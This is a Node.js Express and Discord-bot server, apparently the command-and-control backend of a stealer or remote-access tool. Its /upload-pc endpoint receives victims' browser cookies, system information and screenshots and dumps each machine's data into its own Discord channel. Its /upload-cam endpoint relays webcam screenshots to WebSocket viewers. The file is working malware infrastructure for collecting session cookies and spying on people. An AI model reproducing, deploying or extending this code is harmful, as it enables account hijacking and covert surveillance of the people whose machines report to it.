import express from "express";
import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
import http from "http";
import { WebSocketServer } from "ws";
import crypto from 'crypto';

const app = express();
app.use(express.json({ limit: "100mb" }));

const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const CATEGORY_BASE_PC = "Все ПК";
const CATEGORY_BASE_CAM = "Камеры";
const ONLINE_TIMEOUT = 3*60*1000;
const MAX_FILE_SIZE = 6*1024*1024;
const CATEGORY_MAX_CHILDREN = 50;

const onlinePCs = {};
const pendingCommands = {};
const channelByPC = {};
const channelByCam = {};
const wsCameraClients = {};
const camLastUpload = {};
const pcFileLastSent = {};

const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
bot.once("ready", () => console.log(`✅ Бот вошёл как ${bot.user.tag}`));

function shortHash(s,len=8){ return crypto.createHash('sha1').update(s).digest('hex').slice(0,len); }
function safeChannelName(prefix,id){ return `${prefix}-${shortHash(id)}`.toLowerCase(); }

app.post("/upload-pc", async (req,res)=>{
    try{
        const { pcId, cookies, systemInfo, screenshot } = req.body;
        if(!pcId) return res.status(400).json({error:"pcId required"});
        onlinePCs[pcId] = Date.now();

        const guild = await bot.guilds.fetch(GUILD_ID);
        const channelName = safeChannelName('pc', pcId);
        const files = [];
        if(cookies) files.push({ attachment: Buffer.from(JSON.stringify({cookies})), name:`${channelName}-cookies.json` });
        if(systemInfo) files.push({ attachment: Buffer.from(JSON.stringify({systemInfo})), name:`${channelName}-system.json` });
        if(screenshot) files.push({ attachment: Buffer.from(screenshot, "base64"), name:`${channelName}-screenshot.jpeg` });

        const category = guild.channels.cache.find(c=>c.name===CATEGORY_BASE_PC && c.type===ChannelType.GuildCategory) 
                         || await guild.channels.create({name:CATEGORY_BASE_PC, type:ChannelType.GuildCategory});
        const channel = await guild.channels.create({name:channelName,type:ChannelType.GuildText,parent:category.id});
        channelByPC[pcId] = channel.id;

        if(files.length) await channel.send({ files });
        res.json({success:true});
    }catch(e){ console.error(e); res.status(500).json({error:e.message}); }
});

app.post("/upload-cam", async (req,res)=>{
    try{
        const { camId, screenshot } = req.body;
        if(!camId || !screenshot) return res.status(400).json({error:"camId and screenshot required"});
        if(wsCameraClients[camId]) wsCameraClients[camId].forEach(ws=>ws.send(screenshot));
        res.json({success:true});
    }catch(e){ console.error(e); res.status(500).json({error:e.message}); }
});

const server = http.createServer(app);
const wss = new WebSocketServer({ noServer: true });
server.on("upgrade", (request, socket, head)=>{
    wss.handleUpgrade(request, socket, head, ws => wss.emit("connection", ws, request));
});

server.listen(process.env.PORT||3000, ()=>console.log("🚀 Сервер запущен"));
bot.login(DISCORD_BOT_TOKEN);
